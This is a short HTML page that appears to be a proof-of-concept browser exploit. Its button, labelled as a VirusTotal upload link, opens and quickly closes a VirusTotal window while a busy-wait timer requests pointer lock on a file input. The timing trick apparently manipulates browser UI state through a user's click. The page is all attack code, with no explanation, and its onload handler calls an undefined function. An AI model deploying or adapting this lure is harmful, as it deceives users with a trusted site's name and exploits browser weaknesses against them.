<!DOCTYPE html>
<html>
<head>
<script>

// setExactTimeout helps increase success rate on Linux platforms (thanks to Mohan pd. Author of The Coders Blog)
const setExactTimeout = function(callback, duration, resolution) {
	const start = (new Date()).getTime();
	const timeout = setInterval(function(){
		if ((new Date()).getTime() - start > duration) {
			callback();
			clearInterval(timeout);
		}
	}, resolution);

	return timeout;
};

function start() {
    setTimeout(function () {
        var x = window.open("https://www.virustotal.com/gui/")

        setTimeout(function () {
            if (document.pointerLockElement === null) {
                x.close();
            }
        }, 33)
    }, 9)

    setExactTimeout(function () {
        plt.requestPointerLock();
    }, 5, 1)
}
</script>
</head>

<body onload="main()">
    <input id="plt" type="file"></input>
        <button onclick="start()">Visit VirusTotal to Upload File</button>
</body>

</html>
